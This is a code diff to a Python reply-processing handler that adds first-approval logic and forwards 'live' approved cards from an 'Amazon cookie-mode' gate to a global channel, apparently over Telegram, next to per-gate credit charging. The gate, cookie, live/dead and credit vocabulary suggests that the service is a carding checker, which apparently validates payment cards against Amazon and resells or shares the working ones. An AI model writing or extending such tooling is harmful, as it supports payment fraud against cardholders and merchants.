@@ -490,6 +490,21 @@ async def process_incoming(reply: IncomingReply) -> None:
                     cost=batch_row.gate_credit_cost,
                 )
 
+        # Live-forward decision (Amazon cookie-mode): forward this card IFF it is
+        # the FIRST ✅ for this message — "no prior ok revision", NOT a status
+        # transition, so a ✅→❌→✅ re-bounce forwards EXACTLY ONCE (mirrors the
+        # credits first-✅ guard, charge_if_first_ok above). MUST read BEFORE
+        # add_full so the ok row we're about to insert isn't counted.
+        forward_live_card = False
+        if (
+            cookie_mode
+            and cookie_verdict_kind == VERDICT_APPROVED
+            and status == responses_repo.STATUS_OK
+        ):
+            forward_live_card = not await responses_repo.has_ok_revision(
+                session, chat_id=reply.chat_id, message_id=reply.message_id
+            )
+
         full_row = await responses_repo.add_full(
             session,
             tenant_id=attributed.tenant_id,
@@ -609,6 +624,20 @@ async def process_incoming(reply: IncomingReply) -> None:
                 verdict_kind=cookie_verdict_kind,
             )
         )
+
+    # 🔒 Live forward (Amazon cookie-mode): a FRESH approved card ("live") is
+    # forwarded VERBATIM (``clean_text`` — the redacted original, NO LIVE/DEAD
+    # rebrand, NO raw reply.text) to the owner-configured global channel.
+    # ``forward_live_card`` was decided pre-commit via has_ok_revision (first-✅,
+    # not a transition — a ✅→❌→✅ re-bounce forwards once). Runs AFTER commit and
+    # is fully best-effort (forward_live swallows every failure): a forward
+    # failure NEVER touches the persisted/emitted capture state.
+    if forward_live_card:
+        # Lazy import breaks the import cycle capture → live_forward → telegram
+        # → capture (telegram imports IncomingReply from this module at load).
+        from app.services import live_forward as live_forward_service
+
+        await live_forward_service.forward_live(clean_text)
 
     # Credits balance update (credits feature): emitted ONLY on a real debit
     # (charged_balance is None for free gates and for an already-charged
